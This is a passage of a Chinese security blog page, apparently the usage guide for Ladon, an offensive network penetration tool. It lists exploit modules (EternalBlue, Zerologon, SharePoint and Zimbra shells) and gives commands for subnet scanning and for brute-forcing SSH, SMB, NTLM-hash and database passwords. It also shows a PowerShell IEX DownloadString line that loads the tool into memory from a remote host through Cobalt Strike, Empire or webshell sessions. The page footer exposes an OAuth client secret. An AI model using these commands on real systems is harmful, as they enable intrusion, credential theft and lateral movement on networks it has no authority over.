+<td>[CVE-2019-9621 Zimbra GetShell Exploit]（ <a target="_blank" rel="noopener" href="https://github.com/k8gege/ZimbraExploit">https://github.com/k8gege/ZimbraExploit</a> )</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Vulnerability Exploitation</td>
+<td>Python</td>
+<td>[CVE-2019-0604 SharePoint GetShell Exploit]（ <a target="_blank" rel="noopener" href="https://github.com/k8gege/CVE-2019-0604">https://github.com/k8gege/CVE-2019-0604</a> )</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Vulnerability exploitation</td>
+<td>Exp generator</td>
+<td>[CVE 2016-3088 ActiveMQ GetShell Exploit]（ <a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">https://github.com/k8gege/K8CScan/wiki/漏洞利用</a> -CVE-2016-3088-ActiveMQ-GetShell-Exploit)</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Vulnerability Exploitation</td>
+<td>Python</td>
+<td>[Apache Solr 8.2.0 Velocity RCE 0day Exploit]（ <a target="_blank" rel="noopener" href="https://github.com/k8gege/SolrExp">https://github.com/k8gege/SolrExp</a> )</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Vulnerability Exploitation</td>
+<td>Exp Generator</td>
+<td>[PhpStudy Backdoor GetShell Exploit]（ <a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F">https://github.com/k8gege/K8CScan/wiki/漏洞扫描</a> -PhpStudy%E5%90%8E%E9%97%A8)</td>
+</tr>
+<tr>
+<td>8</td>
+<td>Command execution</td>
+<td>INI configuration</td>
+<td>[INI calls external program commands to batch Linux upper control]（ <a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/wiki/%E8%B0%83%E7%94%A8%E5%91%BD%E4%BB%A4">https://github.com/k8gege/K8CScan/wiki/调用命令</a> -%E6%89%B9%E9%87%8FSSH%E4%B8%8A%E6%8E%A7)</td>
+</tr>
+<tr>
+<td>9</td>
+<td>command execution</td>
+<td>ini configuration</td>
+<td>[ini calls external program commands batch windowns upper control]（ <a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/wiki/%E8%B0%83%E7%94%A8%E5%91%BD%E4%BB%A4">https://github.com/k8gege/K8CScan/wiki/调用命令</a> -%E6%89%B9%E9%87%8FWin%E4%B8%8A%E6%8E%A7)</td>
+</tr>
+<tr>
+<td>10</td>
+<td>vulnerability scanning</td>
+<td>Python</td>
+<td>[php-fpm Remote Code Execution Vulnerability (cve-2019-11043)]（ <a target="_blank" rel="noopener" href="https://github.com/k8gege/CVE-2019-11043">https://github.com/k8gege/CVE-2019-11043</a> )</td>
+</tr>
+<tr>
+<td>11</td>
+<td>Vulnerability scanning</td>
+<td>Exp generator</td>
+<td>[Weblogic CVE-2018-2894 vulnerability detection]（ <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F">https://github.com/k8gege/Ladon/wiki/漏洞扫描</a> -CVE-2018-2894)</td>
+</tr>
+<tr>
+<td>12</td>
+<td>Vulnerability Exploitation</td>
+<td>PowerShell</td>
+<td>[MS17010EXP Eternal Blue Vulnerability Exploitation]（ <a target="_blank" rel="noopener" href="https://github.com/k8gege/MS17010EXP">https://github.com/k8gege/MS17010EXP</a> )</td>
+</tr>
+<tr>
+<td>13</td>
+<td>script call</td>
+<td>PowerShell</td>
+<td>[Kali 2019 no PowerShell execution script]（ <a href="http://k8gege.org/p/32e1a912.html">http://k8gege.org/p/32e1a912.html</a> )</td>
+</tr>
+<tr>
+<td>14</td>
+<td>password scanning</td>
+<td>ini configuration</td>
+<td>[IPC password blasting of ipcscan.ini ini plug-in]（ <a href="http://k8gege.org/p/55476.html">http://k8gege.org/p/55476.html</a> )</td>
+</tr>
+<tr>
+<td>15</td>
+<td>Password scanning</td>
+<td>INI configuration</td>
+<td>[Smb password explosion of smbscan.ini INI plug-in]（ <a href="http://k8gege.org/p/55476.html">http://k8gege.org/p/55476.html</a> )</td>
+</tr>
+<tr>
+<td>16</td>
+<td>password scanning</td>
+<td>ini configuration</td>
+<td>[ntlmhash blasting of smbhash.ini ini ini plug-in]（ <a href="http://k8gege.org/p/55476.html">http://k8gege.org/p/55476.html</a> )</td>
+</tr>
+<tr>
+<td>17</td>
+<td>password scanning</td>
+<td>ini configuration</td>
+<td>[winrm password blasting of winrmscan.ini ini plug-in]（ <a href="http://k8gege.org/Ladon/WinrmScan.html">http://k8gege.org/Ladon/WinrmScan.html</a> )</td>
+</tr>
+<tr>
+<td>18</td>
+<td>Information Collection</td>
+<td>. NET</td>
+<td>[Detect whether the website uses Shiro]（ <a href="http://k8gege.org/Ladon/IsShiro.html">http://k8gege.org/Ladon/IsShiro.html</a> )</td>
+</tr>
+<tr>
+<td>19</td>
+<td>Vulnerability scanning</td>
+<td>Python</td>
+<td>[Domain control right CVE-2020-1472-EXP]（ <a target="_blank" rel="noopener" href="https://github.com/k8gege/CVE-2020-1472-EXP">https://github.com/k8gege/CVE-2020-1472-EXP</a> )</td>
+</tr>
+<tr>
+<td>20</td>
+<td>exploit</td>
+<td>exp generator</td>
+<td>[drupal cve-2018-7600]（ <a href="http://k8gege.org/p/CVE-2018-7600.html">http://k8gege.org/p/CVE-2018-7600.html</a> )</td>
+</tr>
+<tr>
+<td>21</td>
+<td>[CVE-2020-0796]( <a href="http://k8gege.org/p/smbghost_cve_2020_0796.html">http://k8gege.org/p/smbghost_cve_2020_0796.html</a> ）</td>
+<td>SMBHost Win10 remote vulnerability</td>
+<td></td>
+</tr>
+<tr>
+<td>22</td>
+<td>Vulnerability Exploitation</td>
+<td>Exp Generator</td>
+<td>[IIS Write Permission Vulnerability Exploitation]（ <a href="http://k8gege.org/Ladon/iisput.html">http://k8gege.org/Ladon/iisput.html</a> )</td>
+</tr>
+</tbody>
+</table>
+<p>Document reference Cscan: <a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/wiki">https://github.com/k8gege/K8CScan/wiki</a></p>
+<h3 id="Intermediate-usage">Intermediate usage</h3>
+<h3 id="Batch-scanning">Batch scanning</h3>
+<p>0x001 Parameter ip/24 ip/16 ip/8</p>
+<p>Command: Ladon 192.168.1.8/24 OnlinePC</p>
+<p>0x002 file IP txt ip24.txt ip16.txt url. txt host. txt domain. txt str.txt</p>
+<p>Create corresponding files in the root directory of the program. For example, use ip.txt for batch scanning of multiple IPs, and use ip24.txt for batch scanning of multiple C segments</p>
+<p>There is no need to specify a TXT program to automatically load the file for scanning. For example, to scan a surviving host, just command: Ladon onlinepc</p>
+<h3 id="Disable-ping-scanning">Disable ping scanning</h3>
+<p>The default scanning will first scan whether the host is alive through ICMP. When using the tool to forward Intranet</p>
+<p>Or when ping is disabled on the target machine, use the noping parameter to scan, which is a little slower</p>
+<p>Ladon noping</p>
+<p>Ladon noping 192.168.1.8/24</p>
+<p>Ladon noping 192.168.1.8/24 MS17010</p>
+<h3 id="Socks5-Proxy-Scan">Socks5 Proxy Scan</h3>
+<p>See: <a href="http://k8gege.org/Ladon/proxy.html">http://k8gege.org/Ladon/proxy.html</a></p>
+<h4 id="KaliLadon-under-linux-mac-os">KaliLadon under linux/mac os</h4>
+<p>proxychains mono Ladon noping 192.168.1.8/24 MS17010</p>
+<p>proxychains mono Ladon noping <a target="_blank" rel="noopener" href="http://192.168.1.1">http://192.168.1.1</a> WhatCMS</p>
+<h4 id="Ladon-exe-under-Windows">Ladon.exe under Windows</h4>
+<p>Proxifier 3.42 and above are recommended, preferably the latest version 4.0.1</p>
+<p>Example: scan the target section 10.1.2 for ms17010 vulnerabilities (noping must be added)</p>
+<p>Ladon noping 10.1.2.8/24 MS17010</p>
+<h3 id="Configure-INI-to-call-arbitrary-programs-and-password-explosion">Configure INI to call arbitrary programs and password explosion</h3>
+<p>Applicable scenario: relevant commands or third-party tools need to be called for batch operation</p>
+<p>Or there is a new POC, but it is too late or cannot be written into a DLL to call it</p>
+<p>Many third-party tools do not support batch or batch network segments at all</p>
+<p>But Ladon is not limited to batch IP, URL, IP segment, any content, etc</p>
+<p>It is the most suitable tool for verifying whether there are loopholes in the intranet in an emergency</p>
+<p>When new vulnerabilities come, it’s good if you can adjust the POC well. It takes more time to batch</p>
+<h4 id="Call-the-system-ping-command-to-probe-the-surviving-host">Call the system ping command to probe the surviving host</h4>
+<p>ping.ini</p>
+<p>[Ladon]</p>
+<p>exe=cmd.exe</p>
+<p>arg=/c ping $ip$</p>
+<p>Command: Ladon ping.ini</p>
+<p>Command: Ladon 192.168.1.8/24 ping.ini</p>
+<h4 id="Call-Python-POC-to-batch-detect-vulnerabilities">Call Python POC to batch detect vulnerabilities</h4>
+<p>[Ladon]</p>
+<p>exe=F:\Python279\python.exe</p>
+<p>arg=CVE-2019-11043-POC. py $ip$</p>
+<p>example: <a target="_blank" rel="noopener" href="https://github.com/k8gege/CVE-2019-11043">https://github.com/k8gege/CVE-2019-11043</a></p>
+<h4 id="User-defined-program-password-explosion">User defined program password explosion</h4>
+<p>Example: Call the modified smbexec.exe to verify the HASH password. The original version cannot be exploded without exiting</p>
+<p>There are four files in the root directory, smbexec.exe, smbhash.ini, user.txt, and pass.txt.</p>
+<p>smbhash.ini</p>
+<p>[Ladon]</p>
+<p>exe=smbexec.exe</p>
+<p>arg=-hashes $pass$ $user$@$ip$</p>
+<p>isok=Launching semi-interactive shell</p>
+<p>port=445</p>
+<p>log=true</p>
+<p>INI Parameter Description</p>
+<p>Isok: success flag, required. If smbexec succeeds, it returns “Launching semi interactive shell”</p>
+<p>Port: corresponding port, not required. If the SMB is 445, Ladon detects that the port is open first, and then performs password blasting</p>
+<p>Log: program log; not required. If some programs return a bunch of error results, we don’t want to see them, can we not display them</p>
+<p>Check whether intranet segment C uses the same password. Command: Ladon 192.168.1.1/24 smbhash.ini</p>
+<p>See: <a href="http://k8gege.org/p/53177.html">http://k8gege.org/p/53177.html</a></p>
+<h3 id="Configure-port-scan-parameters">Configure port scan parameters</h3>
+<h4 id="Port-txt-Custom-Port">Port.txt Custom Port</h4>
+<p>When using the portscan module, common high-risk vulnerability ports are scanned by default</p>
+<p>Can Ladon scan when the default port is modified?</p>
+<p>Use port.txt</p>
+<p>Format 1: 80,2114333306445</p>
+<p>Format 2: 80-88, 21-235800-5900</p>
+<p>Format 3:</p>
+<p>twenty-one</p>
+<p>twenty-three</p>
+<p>eighty</p>
+<p>Format 4:</p>
+<p>80-88</p>
+<p>21-23</p>
+<h4 id="Command-line-custom-port">Command line custom port</h4>
+<p>Ladon 192.168.1.8/24 PortScan 80-89</p>
+<p>Ladon 192.168.1.8-192.168.1.200 PortScan 22,80,1433,21,3306,1521</p>
+<h3 id="Configure-password-blasting-parameters">Configure password blasting parameters</h3>
+<ol>
+<li>It supports standard user.txt and pass.txt account password cracking, and each user needs to run the password correctly or completely</li>
+</ol>
+<p>2 Support userpass.txt (to store the user name and corresponding password), which is used to quickly verify whether other machines have the same account password</p>
+<ol start="3">
+<li>It supports check.txt (storing IP/port/database name/user/password). If the port and database name are not specified, the default is used</li>
+</ol>
+<p>User.txt and pass.txt store the user and password respectively</p>
+<p>Userpass.txt stores the user password group, that is, each line stores the user and password</p>
+<p>Check.txt each line stores IP \ port \ user \ password</p>
+<h4 id="Database-password-detection">Database password detection</h4>
+<p>The database is different from other password bursts. Sometimes the database has permissions, and the designated user can only connect to the designated database, but not to the default database</p>
+<h5 id="MSSQL-password-verification">MSSQL password verification</h5>
+<p>(Large intranet may collect a large number of machine passwords from other machines. The first step must be to verify.)</p>
+<p>If it is not the default port, please change the following port to the modified port. A single IP can be scanned directly by Ladon IP: port mssqlscan</p>
+<p>check.txt</p>
+<p>192.168.1.8 1433 master sa k8gege</p>
+<p>192.168.1.8 sa k8gege</p>
+<p>192.168.1.8 1433 sa k8gege</p>
+<p>Command: Ladon MssqlScan</p>
+<h5 id="Oracle-is-the-same">Oracle is the same</h5>
+<p>192.168.1.8 1521 orcl system k8gege</p>
+<p>192.168.1.8 orcl system k8gege</p>
+<p>192.168.1.8 system k8gege</p>
+<p>Command: Ladon oraclescan</p>
+<h5 id="MySQL-does-not-need-to-specify-a-database-name">MySQL does not need to specify a database name</h5>
+<p>192.168.1.8 3306 root k8gege</p>
+<p>192.168.1.8 root k8gege</p>
+<p>Command: Ladon MysqlScan</p>
+<h5 id="System-password">System password</h5>
+<h6 id="SSH-password-explosion">SSH password explosion</h6>
+<p>check.txt</p>
+<p>192.168.1.8 22 root k8gege</p>
+<p>192.168.1.8 root k8gege</p>
+<p>Command: Ladon SshScan</p>
+<p>Detailed usage: <a href="http://k8gege.org/Ladon/sshscan.html">http://k8gege.org/Ladon/sshscan.html</a></p>
+<h6 id="SMB-WMI-password-explosion">SMB/WMI password explosion</h6>
+<p>check.txt</p>
+<p>192.168.1.8 admin k8gege</p>
+<p>Command: Ladon WmiScan or Ladon SmbScan</p>
+<h6 id="NTLM-HASH-Password-Burst">NTLM HASH Password Burst</h6>
+<p>check.txt</p>
+<p>192.168.1.8 admin k8gege</p>
+<p>Command: Ladon wmiscan or Ladon smbscan</p>
+<h5 id="Website-password">Website password</h5>
+<h6 id="Weblogic-password-blasting">Weblogic password blasting</h6>
+<p>check. Txt (URL user password)</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.8:7001/console">http://192.168.1.8:7001/console</a> weblogic k8gege</p>
+<p>Command: Ladon weblogicscan</p>
+<h5 id="File-password">File password</h5>
+<h6 id="Password-explosion-of-RAR-file">Password explosion of RAR file</h6>
+<p>Since the RAR compressed package only needs one password, it only needs pass.txt. Note that the Chinese password needs to save TXT as ANSI code</p>
+<p>Command: Ladon test rar RarScan</p>
+<h3 id="PowerShell">PowerShell</h3>
+<p>PowerLadon is perfectly compatible with win7-win10 PowerShell. For remote control that does not support plug-in. net programs, you can use</p>
+<p>For the PowerShell version, you can also remotely load the memory under the CMD command line to achieve file free scanning. After the module is loaded, its usage is consistent with EXE.</p>
+<h4 id="0x001-PowerShell-local-loading">0x001 PowerShell local loading</h4>
+<p>Suitable for supporting PowerShell interactive remote control or shell, such as cobalt strike</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt; powershell </span><br><span class="line"></span><br><span class="line">&gt; Import-Module .\Ladon.ps1</span><br><span class="line"></span><br><span class="line">&gt; Ladon OnlinePC</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<p><img data-original="http://k8gege.org/k8img/Ladon/PowerLadon.gif"></p>
+<h4 id="0x002-Cmd-Local-Load">0x002 Cmd Local Load</h4>
+<p>It is applicable to remote control or shell that has not kept up with the times and only supports CMD interaction</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt; powershell Import-Module .\Ladon. ps1; Ladon OnlinePC</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<p><img data-original="http://k8gege.org/k8img/Ladon/ps/CmdPSLadon.gif"></p>
+<h4 id="0x003-Cmd-Remote-Load">0x003 Cmd Remote Load</h4>
+<p>It is applicable to remote control or shell that has not kept up with the times and only supports CMD interaction</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt; powershell <span class="string">"IEX (New-Object Net.WebClient).DownloadString(' http://192.168.1.5:800/Ladon.ps1 '); Ladon OnlinePC"</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<p><img data-original="http://k8gege.org/k8img/Ladon/ps/CmdPSRemoteLadon.gif"></p>
+<h4 id="0x004-remote-control-interactive-CMD">0x004 remote control interactive CMD</h4>
+<p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_rat.PNG"></p>
+<h4 id="0x005-Kitchen-knife-non-interactive-CMD">0x005 Kitchen knife non interactive CMD</h4>
+<p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_cd.PNG"></p>
+<h4 id="0x006-Empire-non-interactive-CMD">0x006 Empire non interactive CMD</h4>
+<p>There is a problem with the shell of Empire. The semicolon is truncated. You can add CMD / C</p>
+<p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_empire.PNG"></p>
+<h4 id="0x007-MSF-Interactive-CMD">0x007 MSF Interactive CMD</h4>
+<h3 id="Advanced-usage">Advanced usage</h3>
+<p>Ladon was originally designed as a scanning framework, with built-in functions for convenience</p>
+<p>After all, it is troublesome to upload one more file to the target if you need to use one function</p>
+<p>Unlike MSF, most frameworks and modules don’t matter, because you only use them locally</p>
+<p>In order to allow everyone to customize the module, Ladon plug-in supports multiple programming languages</p>
+<p>You can configure plug-ins through INI to learn that HTTP can generate POC through the EXP generator</p>
+<p>Know programming, can use C #, Delphi, VC to write DLL and PowerShell scripts</p>
+<h4 id="0x001-exp-generator">0x001 exp generator</h4>
+<p>Exp generator tutorial: <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/LadonExp-Usage">https://github.com/k8gege/Ladon/wiki/LadonExp-Usage</a></p>
+<p>Practical examples: <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F">https://github.com/k8gege/Ladon/wiki/漏洞扫描</a> -CVE-2018-2894</p>
+<h4 id="0x002-user-defined-module-tutorial">0x002 user defined module tutorial</h4>
+<p>Custom module tutorial: <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle">https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle</a></p>
+<h4 id="0x003-plug-in-example-source-code">0x003 plug in example source code</h4>
+<p><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/raw/master/MoudleDemo.rar">https://github.com/k8gege/Ladon/raw/master/MoudleDemo.rar</a></p>
+<p>Complete tutorial: <a href="http://k8gege.org/Ladon">http://k8gege.org/Ladon</a></p>
+<h3 id="Ladon-Download">Ladon Download</h3>
+<p>Historical version: <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a></p>
+<p>911 version: <a href="http://k8gege.org/Download">http://k8gege.org/Download</a></p>
+
+    </div>
+    
+    <div class="reward" ontouchstart="">
+    <div class="reward-wrap">
+	<img height="180" width="180" data-original="../images/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/p/ExchangeScan.html" class="pre-post btn btn-default" title="〖Tech〗Ladon Exchange 密码爆破教程">
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            〖Tech〗Ladon Exchange 密码爆破教程</span>
+    </a>
+    
+    
+    <a href="/p/Ladon.html" class="next-post btn btn-default" title="〖工具〗Ladon模块化网络渗透工具&amp;Cobalt Strike">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            〖工具〗Ladon模块化网络渗透工具&amp;Cobalt Strike</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon-for-Windows"><span class="toc-text">Ladon for Windows</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon-GUI"><span class="toc-text">Ladon GUI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon-for-Cobalt-Strike"><span class="toc-text">Ladon for Cobalt Strike</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon-for-PowerShell"><span class="toc-text">Ladon for PowerShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-Ladon"><span class="toc-text">Python Ladon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon-for-Linux"><span class="toc-text">Ladon for Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Instructions"><span class="toc-text">Instructions:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-code-compilation"><span class="toc-text">Source code compilation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Finished-product-download"><span class="toc-text">Finished product download</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Preface"><span class="toc-text">Preface</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#About-Ladon"><span class="toc-text">About Ladon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Program-introduction"><span class="toc-text">Program introduction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Easy-to-use"><span class="toc-text">Easy to use</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Operating-environment"><span class="toc-text">Operating environment</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows"><span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Full-platform-ladongo-supports-Linux-MAC-arm-and-MIPS"><span class="toc-text">Full platform ladongo supports Linux, MAC, arm and MIPS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exotic-conditions"><span class="toc-text">Exotic conditions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Purpose"><span class="toc-text">Purpose</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Features"><span class="toc-text">Features</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Program-parameter-function"><span class="toc-text">Program parameter function</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Built-in-function-module-117"><span class="toc-text">Built in function module (117)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x001-Asset-Scan-11"><span class="toc-text">0x001 Asset Scan (11)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x002-fingerprint-identification-service-identification-17"><span class="toc-text">0x002 fingerprint identification / service identification (17)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x003-Password-detection-password-explosion-18"><span class="toc-text">0x003 Password detection/password explosion (18)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x004-vulnerability-detection-exploitation-12"><span class="toc-text">0x004 vulnerability detection / exploitation (12)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x005-Encryption-and-decryption-4"><span class="toc-text">0x005 Encryption and decryption (4)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x007-network-sniffing-3"><span class="toc-text">0x007 network sniffing (3)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x008-password-reading-3"><span class="toc-text">0x008 password reading (3)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x009-Information-Collection-12"><span class="toc-text">0x009 Information Collection (12)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x010-Remote-execution-8"><span class="toc-text">0x010 Remote execution (8)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x011-Right-raising-and-right-lowering-9"><span class="toc-text">0x011 Right raising and right lowering (9)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x012-Rebound-shell-4"><span class="toc-text">0x012 Rebound shell (4)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Port-forwarding"><span class="toc-text">Port forwarding</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x014-other-functions-12"><span class="toc-text">0x014 other functions (12)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#External-plug-in-module-21"><span class="toc-text">External plug-in module (21)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Intermediate-usage"><span class="toc-text">Intermediate usage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Batch-scanning"><span class="toc-text">Batch scanning</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Disable-ping-scanning"><span class="toc-text">Disable ping scanning</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Socks5-Proxy-Scan"><span class="toc-text">Socks5 Proxy Scan</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#KaliLadon-under-linux-mac-os"><span class="toc-text">KaliLadon under linux/mac os</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ladon-exe-under-Windows"><span class="toc-text">Ladon.exe under Windows</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Configure-INI-to-call-arbitrary-programs-and-password-explosion"><span class="toc-text">Configure INI to call arbitrary programs and password explosion</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Call-the-system-ping-command-to-probe-the-surviving-host"><span class="toc-text">Call the system ping command to probe the surviving host</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Call-Python-POC-to-batch-detect-vulnerabilities"><span class="toc-text">Call Python POC to batch detect vulnerabilities</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#User-defined-program-password-explosion"><span class="toc-text">User defined program password explosion</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Configure-port-scan-parameters"><span class="toc-text">Configure port scan parameters</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Port-txt-Custom-Port"><span class="toc-text">Port.txt Custom Port</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Command-line-custom-port"><span class="toc-text">Command line custom port</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Configure-password-blasting-parameters"><span class="toc-text">Configure password blasting parameters</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Database-password-detection"><span class="toc-text">Database password detection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#MSSQL-password-verification"><span class="toc-text">MSSQL password verification</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Oracle-is-the-same"><span class="toc-text">Oracle is the same</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MySQL-does-not-need-to-specify-a-database-name"><span class="toc-text">MySQL does not need to specify a database name</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#System-password"><span class="toc-text">System password</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#SSH-password-explosion"><span class="toc-text">SSH password explosion</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#SMB-WMI-password-explosion"><span class="toc-text">SMB/WMI password explosion</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#NTLM-HASH-Password-Burst"><span class="toc-text">NTLM HASH Password Burst</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Website-password"><span class="toc-text">Website password</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Weblogic-password-blasting"><span class="toc-text">Weblogic password blasting</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#File-password"><span class="toc-text">File password</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Password-explosion-of-RAR-file"><span class="toc-text">Password explosion of RAR file</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell"><span class="toc-text">PowerShell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x001-PowerShell-local-loading"><span class="toc-text">0x001 PowerShell local loading</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x002-Cmd-Local-Load"><span class="toc-text">0x002 Cmd Local Load</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x003-Cmd-Remote-Load"><span class="toc-text">0x003 Cmd Remote Load</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x004-remote-control-interactive-CMD"><span class="toc-text">0x004 remote control interactive CMD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x005-Kitchen-knife-non-interactive-CMD"><span class="toc-text">0x005 Kitchen knife non interactive CMD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x006-Empire-non-interactive-CMD"><span class="toc-text">0x006 Empire non interactive CMD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 